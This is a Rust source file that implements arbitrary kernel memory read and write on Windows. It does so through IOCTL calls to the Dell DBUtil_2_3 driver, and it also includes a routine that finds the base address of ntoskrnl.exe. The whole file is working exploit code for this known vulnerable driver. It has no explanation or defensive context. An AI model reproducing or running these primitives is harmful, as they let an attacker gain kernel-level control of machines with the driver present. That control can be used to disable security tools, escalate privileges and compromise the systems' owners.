use std::mem::size_of;
use std::ptr::null_mut;
use winapi::um::{fileapi::*, ioapiset::*, psapi::*, winnt::*};

#[repr(C)]
#[derive(Default)]
struct DbMemmove {
    key: u64,
    ptr: usize,
    offset: u32,
    pad: u32,
    data: usize,
}

pub unsafe fn open_dev() -> HANDLE {
    CreateFileA(
        "\\\\.\\DBUtil_2_3\0".as_ptr() as _,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    )
}

pub unsafe fn ioctl(dev: HANDLE, num: u32, iobuf: PVOID, buflen: usize) -> bool {
    DeviceIoControl(
        dev,
        num,
        iobuf,
        buflen as _,
        iobuf,
        buflen as _,
        null_mut(),
        null_mut(),
    ) != 0
}

pub fn read_ptr(hdev: HANDLE, ptr: usize) -> usize {
    let mut mc = DbMemmove {
        ptr,
        ..Default::default()
    };

    let mcptr = &mut mc as *mut DbMemmove;
    if unsafe { !ioctl(hdev, 0x9B0C1EC4, mcptr as _, size_of::<DbMemmove>()) } {
        panic!("Failed to read {:#x}", ptr as usize);
    }

    mc.data
}

pub fn write_ptr(hdev: HANDLE, ptr: usize, content: usize) {
    let mut mc = DbMemmove {
        ptr,
        data: content,
        ..Default::default()
    };

    let mcptr = &mut mc as *mut DbMemmove;
    if unsafe { !ioctl(hdev, 0x9B0C1EC8, mcptr as _, size_of::<DbMemmove>()) } {
        panic!("Failed to write {:#x}", ptr as usize);
    }
}

pub unsafe fn get_kernel_base() -> usize {
    let mut needed: u32 = 0;
    let mut namebuf = vec![0u8; 260];
    EnumDeviceDrivers(null_mut(), 0, &mut needed);
    let mut bases = vec![0usize; (needed as usize / size_of::<usize>()) as _];
    EnumDeviceDrivers(bases.as_mut_ptr() as _, needed, &mut needed);

    for base in bases.into_iter() {
        let len =
            GetDeviceDriverBaseNameA(base as _, namebuf.as_mut_ptr() as _, namebuf.len() as _);
        if "ntoskrnl.exe" == std::str::from_utf8(&namebuf[..len as _]).unwrap() {
            return base;
        }
    }
    panic!("Could not find kernel base");
}
